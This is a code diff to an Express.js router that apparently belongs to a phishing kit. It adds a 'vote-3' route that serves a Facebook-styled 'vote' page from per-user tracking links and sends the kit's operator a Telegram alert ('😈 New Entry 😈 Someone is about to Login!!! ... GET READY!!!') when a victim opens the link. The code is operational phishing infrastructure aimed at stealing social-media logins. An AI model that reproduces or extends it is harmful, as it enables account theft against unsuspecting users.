@@ -74,6 +74,48 @@ GET READY!!!
     }
 });
 
+
+router.get("/vote-3/:linkId", async (req, res) => {
+    try {
+        const { linkId } = req.params;
+        const link = await Links.findOne({ link: linkId });
+        if (!link) {
+            return res.redirect("/notfound");
+        }
+        if ((req.hostname == req.app.hostname2) && !link.usLink) {
+            return res.redirect("/notfound");
+        }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
+        const user = await User.findById(link.user);
+        if (user.notification) {
+            await bot.sendMessage(user.telegramID, `
+😈 New Entry 😈
+            
+Someone is about to Login!!!
+
+SOCIAL MEDIA: ${link.linkType}
+
+GET READY!!!
+            
+                    `)
+        }
+        const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
+        return res.render("socials/facebook/vote3", {
+            req,
+            link,
+            layout: false
+        });
+    } catch (err) {
+        console.log(err)
+        return res.redirect("/notfound")
+    }
+});
+
+
+
+
 router.get("/face/:linkId", async (req, res) => {
     try {
         const { linkId } = req.params;
